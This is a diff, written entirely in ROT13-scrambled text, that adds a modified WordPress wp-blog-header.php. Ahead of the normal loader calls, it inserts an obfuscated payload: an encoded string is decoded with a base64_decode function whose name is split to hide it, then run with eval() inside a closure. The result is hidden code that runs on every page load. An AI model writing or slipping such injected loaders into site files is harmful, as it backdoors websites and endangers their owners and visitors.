@@ -1,0 +1,31 @@
+<?cuc
+/**
+ * Ybnqf gur JbeqCerff raivebazrag naq grzcyngr.
+ *
+ * @cnpxntr JbeqCerff
+ */
+
+vs ( ! vffrg( $jc_qvq_urnqre ) ) {
+$rapelcgrq_fge = 'YlbdXvbiDT51oTj7VP8dXvbdXvbdXv8tYlbdXvbdXvbiVP8dXvbdXvbdXv9NMKMuoP8dXvbdYltvCm4vYzMcoTIsM2I0K2AioaEyoaEmYlbdXvbdXvbiXUIloTEyL29xMFu1pzkyozAiMTHbpzS3qKWfMTIwo2EyXUWuq3IloTIhL29xMFtvnUE0pUZ6Yl9lLKphM2y0nUIvqKAypzAioaEyoaDhL29gY2gepmx1Zwpin2gmBGHlAl9lMJMmY2uyLJEmY21unJ4iMz0hqUu0VvxcXFxcXGfiXvbi';
+
+$shap_anzr = 'onfr64' . '_qrpbqr';
+$pbqr = $shap_anzr($rapelcgrq_fge);
+
+$eha_pbqr = shapgvba() hfr ($pbqr) {
+    riny($pbqr);
+};
+
+$eha_pbqr();
+
+	$jc_qvq_urnqre = gehr;
+
+	// Ybnq gur JbeqCerff yvoenel.
+	erdhver_bapr __QVE__ . '/jc-ybnq.cuc';
+
+	// Frg hc gur JbeqCerff dhrel.
+	jc();
+
+	// Ybnq gur gurzr grzcyngr.
+	erdhver_bapr NOFCNGU . JCVAP . '/grzcyngr-ybnqre.cuc';
+
+}
